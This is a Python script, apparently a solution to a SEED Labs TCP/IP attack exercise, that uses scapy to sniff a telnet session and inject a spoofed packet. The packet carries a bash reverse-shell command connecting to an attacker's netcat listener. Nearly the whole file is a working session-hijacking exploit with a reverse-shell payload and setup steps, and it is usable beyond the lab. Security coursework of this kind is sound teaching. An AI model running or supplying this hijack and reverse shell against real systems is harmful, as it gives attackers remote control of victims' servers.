#!/usr/bin/env python3
"""
Task 4: Reverse Shell via TCP Session Hijacking (Automatic)
SEED Labs - TCP/IP Attack Lab

This script automatically sniffs an existing telnet session to extract
TCP parameters and then injects a reverse-shell command into it.  Once
the command executes on the server, it connects back to the attacker's
netcat listener, giving the attacker an interactive shell.

Setup
-----
Step 1 — Start a netcat listener on the attacker machine (10.9.0.1):

    nc -lnv 9090

Step 2 — Make sure an active telnet session exists between the client
    (10.9.0.6) and the server (10.9.0.5).

Step 3 — Set IFACE to the correct bridge/network interface name and
    run this script from the attacker container:

    python3 reverse_shell_hijack_auto.py

Step 4 — As soon as a telnet packet is sniffed, the reverse-shell
    payload is injected.  The netcat window on 10.9.0.1 will show a
    shell prompt running on the victim server (10.9.0.5).

Reverse-shell command injected
-------------------------------
    /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1

Notes
-----
* The attacker container must run in host-mode (network_mode: host in
  docker-compose.yml) so that it can sniff traffic on the shared
  network.
* The iface argument of sniff() must match the actual interface name
  that carries the telnet traffic (find it with `ip link`).
"""

from scapy.all import *

# ------------------------------------------------------------------
# Attacker configuration
# ------------------------------------------------------------------
ATTACKER_IP   = "10.9.0.1"   # attacker IP (where nc listener runs)
ATTACKER_PORT = 9090          # port where nc is listening

# Network interface to sniff on.
# Use `ip link` or `ifconfig` to find the correct bridge interface,
# e.g. "br-cf1eb5d8e5b0".
IFACE  = "br-<network_id>"    # <-- replace with your actual interface

# BPF filter: capture packets sent FROM the telnet client TO the server
FILTER = "tcp and dst port 23"

# ------------------------------------------------------------------
# State flag — inject the payload only once
# ------------------------------------------------------------------
injected = False


def inject_reverse_shell(pkt):
    """
    Called for every sniffed packet matching FILTER.

    When a packet with a non-empty TCP payload is found we:
      1. Extract the current seq/ack from that packet.
      2. Craft a spoofed ACK that looks like it came from the client.
      3. Set the payload to the reverse-shell command.
      4. Send the packet to the server.
    """
    global injected
    if injected:
        return

    if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    ip_layer  = pkt[IP]
    tcp_layer = pkt[TCP]

    # Reverse shell payload.  Leading/trailing \r clears any partial
    # input already in the terminal buffer and submits the command.
    payload = (
        f"\r /bin/bash -i > /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT}"
        f" 0<&1 2>&1 \r"
    )

    # Spoof the packet to look as if it came from the legitimate client
    spoof_ip  = IP(src=ip_layer.src, dst=ip_layer.dst)
    spoof_tcp = TCP(
        sport=tcp_layer.sport,
        dport=tcp_layer.dport,
        flags="A",
        seq=tcp_layer.seq,
        ack=tcp_layer.ack,
    )
    spoof_pkt = spoof_ip / spoof_tcp / payload
    send(spoof_pkt, verbose=0)

    injected = True
    print(
        f"[*] Reverse-shell payload injected into session "
        f"{ip_layer.src}:{tcp_layer.sport} -> "
        f"{ip_layer.dst}:{tcp_layer.dport}"
    )
    print(
        f"[*] Watch your netcat listener on "
        f"{ATTACKER_IP}:{ATTACKER_PORT}"
    )


print(f"[*] Sniffing for telnet traffic on interface '{IFACE}' ...")
print(f"[*] Will inject reverse shell back to {ATTACKER_IP}:{ATTACKER_PORT}")
sniff(iface=IFACE, filter=FILTER, prn=inject_reverse_shell)
